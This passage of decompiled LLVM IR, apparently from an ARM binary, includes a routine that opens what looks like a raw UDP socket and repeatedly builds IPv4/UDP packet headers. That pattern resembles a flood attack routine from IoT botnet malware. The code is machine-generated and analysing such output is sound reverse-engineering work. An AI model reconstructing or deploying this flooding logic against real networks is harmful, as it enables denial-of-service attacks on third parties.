  %v0_b728 = phi i32 [ %v0_b718, %dec_label_pc_b6fc ], [ %v0_b728.pre, %dec_label_pc_b7a0 ]
  %v1_b72c = load i32, i32* @r8, align 4
  %v2_b72c = add i32 %v1_b72c, %stack_var_-60.0
  %v3_b72c = inttoptr i32 %v2_b72c to i32*
  %v4_b72c = load i32, i32* %v3_b72c, align 4
  %v3_b734 = call i32 @function_113dc(i32 %v4_b72c, i32 %v0_b728, i32 16)
  %v0_b73c = load i32, i32* @sb, align 4
  %v1_b73c = load i32, i32* @r7, align 4
  %v9_b73c = icmp eq i32 %v0_b73c, %v1_b73c
  %v1_b740 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b740, i32* %r3.global-to-local, align 4
  br i1 %v9_b73c, label %dec_label_pc_b7f4, label %dec_label_pc_b74c

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b6bc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6bc ], [ %v1_b740, %dec_label_pc_b724 ]
  store i32 65535, i32* @r4, align 4
  %v2_b75c = call i32 @function_1215c(i32 65535, i32 1)
  store i32 %v5_b76c, i32* %r3.global-to-local, align 4
  %v1_b778 = load i32, i32* @r4, align 4
  %v9_b778 = icmp eq i32 %v3_b61c, %v1_b778
  %v1_b77c = load i32, i32* @fp, align 4
  %v2_b77c = add i32 %v1_b77c, %arg2
  store i32 %v2_b77c, i32* @r6, align 4
  %v2_b780 = load i32, i32* @sl, align 4
  %v3_b780 = add i32 %v2_b780, %stack_var_-60.0
  %v4_b780 = inttoptr i32 %v3_b780 to i32*
  store i32 %v2_b75c, i32* %v4_b780, align 4
  br i1 %v9_b778, label %dec_label_pc_b78c, label %bb51

bb51:                                             ; preds = %dec_label_pc_b74c
  %v1_b784 = load i32, i32* %r3.global-to-local, align 4
  %v2_b784 = trunc i32 %v1_b784 to i16
  %v3_b784 = load i32, i32* @r6, align 4
  %v4_b784 = add i32 %v3_b784, 2
  %v5_b784 = inttoptr i32 %v4_b784 to i16*
  store i16 %v2_b784, i16* %v5_b784, align 2
  br label %dec_label_pc_b6cc

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b74c
  %v0_b78c = call i32 @function_e0b8()
  %v1_b78c = trunc i32 %v0_b78c to i16
  %v0_b794 = load i32, i32* @fp, align 4
  %v2_b794 = add i32 %v0_b794, %arg2
  store i32 %v2_b794, i32* @r6, align 4
  %v4_b798 = add i32 %v2_b794, 2
  %v5_b798 = inttoptr i32 %v4_b798 to i16*
  store i16 %v1_b78c, i16* %v5_b798, align 2
  br label %dec_label_pc_b6cc

dec_label_pc_b7a0:                                ; preds = %dec_label_pc_b6fc
  %v1_b7a0 = add i32 %v0_b718, 16
  %v2_b7a0 = inttoptr i32 %v1_b7a0 to i32*
  %v3_b7a0 = load i32, i32* %v2_b7a0, align 4
  store i32 %v3_b7a0, i32* %r4.global-to-local, align 4
  %v0_b7a4 = call i32 @function_e0b8()
  %v1_b7b4 = and i32 %v3_b7a0, 65280
  store i32 %v1_b7b4, i32* %r3.global-to-local, align 4
  %v0_b7bc = load i32, i32* @r6, align 4
  %v1_b7bc = add i32 %v0_b7bc, 20
  %v2_b7bc = inttoptr i32 %v1_b7bc to i8*
  %v3_b7bc = load i8, i8* %v2_b7bc, align 1
  %v4_b7bc = zext i8 %v3_b7bc to i32
  %v5_b7c0 = call i32 @llvm.bswap.i32(i32 %v3_b7a0)
  %v7_b7c4 = lshr i32 %v0_b7a4, %v4_b7bc
  %v8_b7c4 = add i32 %v7_b7c4, %v5_b7c0
  %v5_b7dc = call i32 @llvm.bswap.i32(i32 %v8_b7c4)
  store i32 %v5_b7dc, i32* %r3.global-to-local, align 4
  %v2_b7e0 = add i32 %v0_b7bc, 4
  %v3_b7e0 = inttoptr i32 %v2_b7e0 to i32*
  store i32 %v5_b7dc, i32* %v3_b7e0, align 4
  %v0_b728.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b724

dec_label_pc_b7e8:                                ; preds = %dec_label_pc_b6cc
  store i32 %v3_b5c8, i32* %r4.global-to-local, align 4
  store i32 %v18_b5c8, i32* %sb.global-to-local, align 4
  ret i32 %v3_b6d8

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b6b4
  %v1_b83422 = phi i32 [ 0, %dec_label_pc_b6b4 ], [ %v0_b73c, %dec_label_pc_b724 ]
  %v2_b7f8 = icmp eq i32 %v0_b69810, 0
  br i1 %v2_b7f8, label %dec_label_pc_b818.outer, label %dec_label_pc_b830

dec_label_pc_b808:                                ; preds = %dec_label_pc_b818
  store i32 %v1_b80c, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b808 = load i32, i32* @r8, align 4
  %v4_b808 = mul i32 %v1_b80c, 4
  %v5_b808 = add i32 %v0_b808, %v4_b808
  %v6_b808 = inttoptr i32 %v5_b808 to i32*
  %v7_b808 = load i32, i32* %v6_b808, align 4
  %v0_b80c = load i32, i32* @sl, align 4
  %v5_b80c = add i32 %v0_b80c, %v4_b808
  %v6_b80c = inttoptr i32 %v5_b80c to i32*
  %v7_b80c = load i32, i32* %v6_b80c, align 4
  %v4_b810 = call i32 @function_11538(i32 %v7_b808, i32 %v7_b80c, i32 %v0_b81c, i32 16384)
  %v0_b814 = load i32, i32* %r4.global-to-local, align 4
  %v1_b814 = add i32 %v0_b814, 1
  %v0_b818.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b818.outer

dec_label_pc_b818.outer:                          ; preds = %dec_label_pc_b7f4, %dec_label_pc_b808
  %v0_b818.ph = phi i32 [ %v0_b818.pre.pre, %dec_label_pc_b808 ], [ %v1_b83422, %dec_label_pc_b7f4 ]
  %v1_b80c.ph = phi i32 [ %v1_b814, %dec_label_pc_b808 ], [ 0, %dec_label_pc_b7f4 ]
  %v0_b81c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b818

dec_label_pc_b818:                                ; preds = %dec_label_pc_b818.outer, %dec_label_pc_b818
  %v1_b80c = phi i32 [ 0, %dec_label_pc_b818 ], [ %v1_b80c.ph, %dec_label_pc_b818.outer ]
  %v8_b824 = icmp sgt i32 %v0_b818.ph, %v1_b80c
  br i1 %v8_b824, label %dec_label_pc_b808, label %dec_label_pc_b818

dec_label_pc_b830:                                ; preds = %dec_label_pc_b834, %dec_label_pc_b7f4
  %v1_b83421 = phi i32 [ %v1_b83422, %dec_label_pc_b7f4 ], [ %v1_b834, %dec_label_pc_b834 ]
  br label %dec_label_pc_b834

dec_label_pc_b834:                                ; preds = %dec_label_pc_b840, %dec_label_pc_b830
  %v1_b834 = phi i32 [ %v1_b83421, %dec_label_pc_b830 ], [ %v1_b834.pre, %dec_label_pc_b840 ]
  %v1_b840 = phi i32 [ 0, %dec_label_pc_b830 ], [ %v1_b860, %dec_label_pc_b840 ]
  store i32 %v1_b840, i32* @r6, align 4
  %v6_b83c = icmp slt i32 %v1_b840, %v1_b834
  br i1 %v6_b83c, label %dec_label_pc_b840, label %dec_label_pc_b830

dec_label_pc_b840:                                ; preds = %dec_label_pc_b834
  %v0_b838 = load i32, i32* @r5, align 4
  %v0_b840 = load i32, i32* @sl, align 4
  %v4_b840 = mul i32 %v1_b840, 4
  %v5_b840 = add i32 %v0_b840, %v4_b840
  %v6_b840 = inttoptr i32 %v5_b840 to i32*
  %v7_b840 = load i32, i32* %v6_b840, align 4
  store i32 %v7_b840, i32* @r4, align 4
  %v2_b848 = inttoptr i32 %v7_b840 to i16*
  %v3_b848 = call i32 @function_e24c(i16* %v2_b848, i32 %v0_b838)
  %v0_b84c = load i32, i32* @r8, align 4
  %v1_b84c = load i32, i32* @r6, align 4
  %v4_b84c = mul i32 %v1_b84c, 4
  %v5_b84c = add i32 %v4_b84c, %v0_b84c
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v0_b850 = load i32, i32* @r4, align 4
  %v0_b854 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b85c = call i32 @function_11538(i32 %v7_b84c, i32 %v0_b850, i32 %v0_b854, i32 16384)
  %v0_b860 = load i32, i32* @r6, align 4
  %v1_b860 = add i32 %v0_b860, 1
  %v1_b834.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b834

; uselistorder directives
  uselistorder i32 %v1_b834, { 1, 0 }
  uselistorder i32 %v1_b80c, { 2, 1, 0 }
  uselistorder i32 %v5_b7dc, { 1, 0 }
  uselistorder i32 %v3_b7a0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b718, { 1, 0, 2 }
  uselistorder i32 %v3_b6d8, { 1, 3, 2, 0 }
  uselistorder i32 %v3_b66c, { 1, 0 }
  uselistorder i32 %v3_b61c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b818, { 1, 0 }
  uselistorder label %dec_label_pc_b818.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b724, { 1, 0 }
  uselistorder label %dec_label_pc_b6cc, { 1, 0 }
  uselistorder label %dec_label_pc_b6b4, { 1, 0 }
}

define i32 @function_b868(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b868:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b868 = load i32, i32* @sb, align 4
  %v27_b868 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b884 = call i32 @function_1215c(i32 %arg1, i32 4)
  %v0_b888 = load i32, i32* @r5, align 4
  store i32 %v0_b888, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b898 = load i32, i32* @r4, align 4
  store i32 %v0_b898, i32* %r0.global-to-local, align 4
  %v5_b89c = inttoptr i32 %v0_b888 to i32*
  %v6_b89c = call i32 @function_8570(i32 %v0_b898, i32* %v5_b89c, i32 2, i32 0, i32 %v2_b884)
  %v1_b8a8 = urem i32 %v6_b89c, 256
  store i32 %v1_b8a8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8b4 = load i32, i32* @r5, align 4
  store i32 %v0_b8b4, i32* %r1.global-to-local, align 4
  %v0_b8b8 = load i32, i32* @r4, align 4
  store i32 %v0_b8b8, i32* %r0.global-to-local, align 4
  %v5_b8bc = trunc i32 %v6_b89c to i8
  %v6_b8c0 = inttoptr i32 %v0_b8b4 to i32*
  %v7_b8c0 = call i32 @function_8570(i32 %v0_b8b8, i32* %v6_b8c0, i32 3, i32 65535, i32 %v6_b89c)
  %v0_b8c4 = load i32, i32* @r5, align 4
  store i32 %v0_b8c4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b8d4 = load i32, i32* @r4, align 4
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  %v5_b8d8 = inttoptr i32 %v0_b8c4 to i32*
  %v6_b8d8 = call i32 @function_8570(i32 %v0_b8d4, i32* %v5_b8d8, i32 4, i32 64, i32 %v7_b8c0)
  %v1_b8e0 = urem i32 %v6_b8d8, 256
  store i32 %v1_b8e0, i32* %ip.global-to-local, align 4
  %v0_b8e4 = load i32, i32* @r5, align 4
  store i32 %v0_b8e4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8f0 = load i32, i32* @r4, align 4
  store i32 %v0_b8f0, i32* %r0.global-to-local, align 4
  %v6_b8f8 = inttoptr i32 %v0_b8e4 to i32*
  %v7_b8f8 = call i32 @function_8570(i32 %v0_b8f0, i32* %v6_b8f8, i32 5, i32 0, i32 %v1_b8e0)
  %v1_b904 = urem i32 %v7_b8f8, 256
  store i32 %v1_b904, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b910 = load i32, i32* @r5, align 4
  store i32 %v0_b910, i32* %r1.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b91c = inttoptr i32 %v0_b910 to i32*
  %v6_b91c = call i32 @function_8570(i32 %v0_b914, i32* %v5_b91c, i32 6, i32 65535, i32 %v1_b904)
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b91c, i32* %sb.global-to-local, align 4
  %v0_b934 = load i32, i32* @r4, align 4
  store i32 %v0_b934, i32* %r0.global-to-local, align 4
  %v5_b938 = inttoptr i32 %v0_b924 to i32*
  %v6_b938 = call i32 @function_8570(i32 %v0_b934, i32* %v5_b938, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b93c = load i32, i32* @r5, align 4
  store i32 %v0_b93c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b938, i32* @sl, align 4
  %v0_b94c = load i32, i32* @r4, align 4
  store i32 %v0_b94c, i32* %r0.global-to-local, align 4
  %v5_b950 = inttoptr i32 %v0_b93c to i32*
  %v6_b950 = call i32 @function_8570(i32 %v0_b94c, i32* %v5_b950, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b95c = load i32, i32* @r5, align 4
  store i32 %v0_b95c, i32* %r1.global-to-local, align 4
  store i32 %v6_b950, i32* @r6, align 4
  %v0_b964 = load i32, i32* @r4, align 4
  store i32 %v0_b964, i32* %r0.global-to-local, align 4
  %v5_b968 = inttoptr i32 %v0_b95c to i32*
  %v6_b968 = call i32 @function_8570(i32 %v0_b964, i32* %v5_b968, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b974 = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_b974, i32* %r3.global-to-local, align 4
  %v1_b978 = urem i32 %v6_b968, 256
  store i32 %v1_b978, i32* %ip.global-to-local, align 4
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b984 = load i32, i32* @r4, align 4
  store i32 %v0_b984, i32* %r0.global-to-local, align 4
  %v5_b98c = inttoptr i32 %v0_b97c to i32*
  %v6_b98c = call i32 @function_8570(i32 %v0_b984, i32* %v5_b98c, i32 25, i32 %v2_b974, i32 %v1_b978)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9a0 = call i32 @function_115f4(i32 2, i32 3, i32 17)
  store i32 %v3_b9a0, i32* %r0.global-to-local, align 4
  %v7_b9a4 = icmp eq i32 %v3_b9a0, -1
  store i1 %v7_b9a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9a0, i32* @fp, align 4
  br i1 %v7_b9a4, label %dec_label_pc_bd44, label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b868
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9b8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b9cc = call i32 @function_115b0(i32 %v3_b9a0, i32 0, i32 3, i32 %v6_b9b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b9cc, i32* %r0.global-to-local, align 4
  %v7_b9d0 = icmp eq i32 %v5_b9cc, -1
  store i1 %v7_b9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b9d0, label %dec_label_pc_bd3c, label %dec_label_pc_b9d8

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9b0
  %v0_b9d8 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_b9e4 = urem i32 %v0_b9d8, 65536
  store i32 %v3_b9e4, i32* %r2.global-to-local, align 4
  %v3_b9e8 = icmp ugt i32 %v3_b9e4, 1459
  %v9_b9e8 = icmp eq i32 %v3_b9e4, 1460
  store i1 %v9_b9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b9e8, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_b9d8
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_b9d8, %bb
  %v0_ba44 = phi i32 [ %v3_b9e4, %dec_label_pc_b9d8 ], [ 1460, %bb ]
  store i32 %v7_b8c0, i32* %r0.global-to-local, align 4
  %v0_b9f4 = load i32, i32* %sb.global-to-local, align 4
  %v3_b9fc = urem i32 %v0_b9f4, 65536
  store i32 %v3_b9fc, i32* %ip.global-to-local, align 4
  %v0_ba00 = load i32, i32* @r7, align 4
  %v2_ba00 = icmp eq i32 %v0_ba00, 0
  store i1 %v2_ba00, i1* %cpsr_z.global-to-local, align 1
  %v0_ba04 = load i32, i32* @sl, align 4
  %v3_ba04 = mul i32 %v0_ba04, 65536
  br i1 %v2_ba00, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba44, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba34 = phi i32 [ %v3_b9fc, %bb48 ], [ %v0_ba44, %bb49 ]
  %v3_ba14 = urem i32 %v0_ba04, 65536
  store i32 %v3_ba14, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba1c = urem i32 %v7_b8c0, 65536
  store i32 %v3_ba1c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba00, label %.thread, label %dec_label_pc_ba3c

.thread:                                          ; preds = %bb50
  %v2_ba30 = add nsw i32 %v1_ba34, 28
  store i32 %v2_ba30, i32* @sb, align 4
  %v2_ba34 = add nsw i32 %v1_ba34, 8
  store i32 %v2_ba34, i32* @sl, align 4
  br label %dec_label_pc_bb60.preheader

dec_label_pc_ba3c:                                ; preds = %bb50
  %v1_ba44 = add nuw nsw i32 %v0_ba44, 28
  store i32 %v1_ba44, i32* @sb, align 4
  %v1_ba48 = add nuw nsw i32 %v0_ba44, 8
  store i32 %v1_ba48, i32* @sl, align 4
  %tmp51 = mul i32 %v0_b9f4, 256
  %v3_ba5c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_b9f4, 256
  %v4_ba6c = urem i32 %tmp52, 256
  %v5_ba6c = or i32 %v4_ba6c, %v3_ba5c
  store i32 %v5_ba6c, i32* @r6, align 4
  store i32 %v3_ba04, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba44, 256
  %v3_ba78 = and i32 %tmp53, 65280
  store i32 %v3_ba78, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba04, 256
  %v3_ba7c = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba48, 256
  %v3_ba80 = and i32 %tmp55, 65280
  store i32 %v3_ba80, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba44, 256
  %v4_ba84 = urem i32 %tmp56, 256
  %v5_ba84 = or i32 %v4_ba84, %v3_ba78
  store i32 %v5_ba84, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba04, 256
  %v4_ba88 = urem i32 %tmp57, 256
  %v5_ba88 = or i32 %v4_ba88, %v3_ba7c
  store i32 %v5_ba88, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba48 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_b8c0, 256
  %v3_ba90 = and i32 %tmp58, 65280
  store i32 %v3_ba90, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_b8c0, 256
  %v4_baa0 = urem i32 %tmp59, 256
  %v5_baa0 = or i32 %v4_baa0, %v3_ba90
  store i32 %v5_baa0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_ba84, 65536
  %v4_bb14 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_ba88, 65536
  %v7_bb48 = sdiv i32 %sext6, 65536
  %v1_bb08 = trunc i32 %v6_b8d8 to i8
  %v3_bb48 = sext i16 %rev to i32
  br label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %.thread8, %dec_label_pc_ba3c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bab4 = call i32 @function_1215c(i32 1510, i32 1)
  store i32 %v2_bab4, i32* %r0.global-to-local, align 4
  store i32 %v2_b884, i32* %r3.global-to-local, align 4
  %v3_babc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_babc, i32* %r1.global-to-local, align 4
  %v2_bac0 = load i32, i32* @r4, align 4
  %v5_bac0 = mul i32 %v2_bac0, 4
  %v6_bac0 = add i32 %v5_bac0, %v2_b884
  %v7_bac0 = inttoptr i32 %v6_bac0 to i32*
  store i32 %v2_bab4, i32* %v7_bac0, align 4
  %v0_bac4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bac4 = load i32, i32* %r1.global-to-local, align 4
  %v4_bac4 = mul i32 %v1_bac4, 4
  %v5_bac4 = add i32 %v4_bac4, %v0_bac4
  %v6_bac4 = inttoptr i32 %v5_bac4 to i32*
  %v7_bac4 = load i32, i32* %v6_bac4, align 4
  store i32 %v7_bac4, i32* %r0.global-to-local, align 4
  %v1_bac8 = inttoptr i32 %v7_bac4 to i8*
  %v2_bac8 = load i8, i8* %v1_bac8, align 1
  %tmp = urem i8 %v2_bac8, 16
  %v1_bacc = zext i8 %tmp to i32
  %v1_bad0 = or i32 %v1_bacc, 64
  store i32 %v1_bad0, i32* %r3.global-to-local, align 4
  %v1_bad4 = trunc i32 %v1_bad0 to i8
  store i8 %v1_bad4, i8* %v1_bac8, align 1
  %v0_bad8 = load i32, i32* %r0.global-to-local, align 4
  %v1_bad8 = inttoptr i32 %v0_bad8 to i8*
  %v2_bad8 = load i8, i8* %v1_bad8, align 1
  %v1_badc = and i8 %v2_bad8, -16
  %v1_bae0 = or i8 %v1_badc, 5
  store i32 %v1_b904, i32* %ip.global-to-local, align 4
  %v0_bae8 = load i32, i32* %r1.global-to-local, align 4
  %v3_bae8 = mul i32 %v0_bae8, 32
  store i32 %v3_bae8, i32* %r2.global-to-local, align 4
  store i8 %v1_bae0, i8* %v1_bad8, align 1
  %v0_baf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_baf0 = add i32 %v0_baf0, 1
  store i32 %v1_baf0, i32* @r4, align 4
  %v0_baf4 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_baf0, -8
  %v5_baf4 = add i32 %v0_baf4, %tmp61
  store i32 %v5_baf4, i32* %r2.global-to-local, align 4
  store i32 %v6_b89c, i32* %r1.global-to-local, align 4
  %v2_bafc = load i32, i32* %r0.global-to-local, align 4
  %v3_bafc = add i32 %v2_bafc, 1
  %v4_bafc = inttoptr i32 %v3_bafc to i8*
  store i8 %v5_b8bc, i8* %v4_bafc, align 1
  store i32 %v1_b8e0, i32* %r3.global-to-local, align 4
  %v0_bb04 = load i32, i32* %ip.global-to-local, align 4
  %v2_bb04 = icmp eq i32 %v0_bb04, 0
  store i1 %v2_bb04, i1* %cpsr_z.global-to-local, align 1
  %v2_bb08 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb08 = add i32 %v2_bb08, 8
  %v4_bb08 = inttoptr i32 %v3_bb08 to i8*
  store i8 %v1_bb08, i8* %v4_bb08, align 1
  %v0_bb0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bb0c, label %.thread8, label %bb60

bb60:                                             ; preds = %dec_label_pc_baa8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bb10 = load i32, i32* %r0.global-to-local, align 4
  %v4_bb10 = add i32 %v3_bb10, 6
  %v5_bb10 = inttoptr i32 %v4_bb10 to i16*
  store i16 64, i16* %v5_bb10, align 2
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_baa8, %bb60
  store i32 %v4_bb14, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bb1c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb1c = add i32 %v2_bb1c, 9
  %v4_bb1c = inttoptr i32 %v3_bb1c to i8*
  store i8 17, i8* %v4_bb1c, align 1
  %v0_bb20 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb20 = trunc i32 %v0_bb20 to i16
  %v2_bb20 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb20 = add i32 %v2_bb20, 2
  %v4_bb20 = inttoptr i32 %v3_bb20 to i16*
  store i16 %v1_bb20, i16* %v4_bb20, align 2
  store i32 %v6_b98c, i32* %ip.global-to-local, align 4
  %v1_bb28 = load i32, i32* %r0.global-to-local, align 4
  %v2_bb28 = add i32 %v1_bb28, 12
  %v3_bb28 = inttoptr i32 %v2_bb28 to i32*
  store i32 %v6_b98c, i32* %v3_bb28, align 4
  %v0_bb2c = load i32, i32* %r2.global-to-local, align 4
  %v1_bb2c = load i32, i32* @r8, align 4
  %v2_bb2c = add i32 %v1_bb2c, %v0_bb2c
  store i32 %v2_bb2c, i32* %r2.global-to-local, align 4
  %v1_bb30 = add i32 %v2_bb2c, 16
  %v2_bb30 = inttoptr i32 %v1_bb30 to i32*
  %v3_bb30 = load i32, i32* %v2_bb30, align 4
  store i32 %v3_bb30, i32* %r3.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r5, align 4
  %v1_bb34 = trunc i32 %v0_bb34 to i16
  %v2_bb34 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb34 = add i32 %v2_bb34, 4
  %v4_bb34 = inttoptr i32 %v3_bb34 to i16*
  store i16 %v1_bb34, i16* %v4_bb34, align 2
  %v0_bb38 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb38 = add i32 %v0_bb38, 20
  store i32 %v1_bb38, i32* %r1.global-to-local, align 4
  %v0_bb3c = load i32, i32* %r3.global-to-local, align 4
  %v2_bb3c = add i32 %v0_bb38, 16
  %v3_bb3c = inttoptr i32 %v2_bb3c to i32*
  store i32 %v0_bb3c, i32* %v3_bb3c, align 4
  %v0_bb40 = load i32, i32* @r6, align 4
  %v1_bb40 = trunc i32 %v0_bb40 to i16
  %v2_bb40 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb40 = add i32 %v2_bb40, 20
  %v4_bb40 = inttoptr i32 %v3_bb40 to i16*
  store i16 %v1_bb40, i16* %v4_bb40, align 2
  store i32 %v3_bb48, i32* %r0.global-to-local, align 4
  store i32 %v7_bb48, i32* %r3.global-to-local, align 4
  %v0_bb4c = load i32, i32* @r4, align 4
  %v1_bb4c = load i32, i32* @r7, align 4
  %v9_bb4c = icmp eq i32 %v0_bb4c, %v1_bb4c
  store i1 %v9_bb4c, i1* %cpsr_z.global-to-local, align 1
  %v2_bb50 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb50 = add i32 %v2_bb50, 4
  %v4_bb50 = inttoptr i32 %v3_bb50 to i16*
  store i16 %rev, i16* %v4_bb50, align 2
  %v0_bb54 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb54 = trunc i32 %v0_bb54 to i16
  %v2_bb54 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb54 = add i32 %v2_bb54, 2
  %v4_bb54 = inttoptr i32 %v3_bb54 to i16*
  store i16 %v1_bb54, i16* %v4_bb54, align 2
  %v0_bb58 = load i32, i32* @r4, align 4
  store i32 %v0_bb58, i32* %stack_var_-44, align 4
  %v5_bb5c = icmp slt i32 %v0_bb4c, %v1_bb4c
  br i1 %v5_bb5c, label %dec_label_pc_baa8, label %dec_label_pc_bb60.preheader.loopexit

dec_label_pc_bb60.preheader.loopexit:             ; preds = %.thread8
  %v0_bb64.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_bb60.preheader

dec_label_pc_bb60.preheader:                      ; preds = %.thread, %dec_label_pc_bb60.preheader.loopexit
  %v0_bb64.pre = phi i32 [ %v0_bb64.pre.pre, %dec_label_pc_bb60.preheader.loopexit ], [ 0, %.thread ]
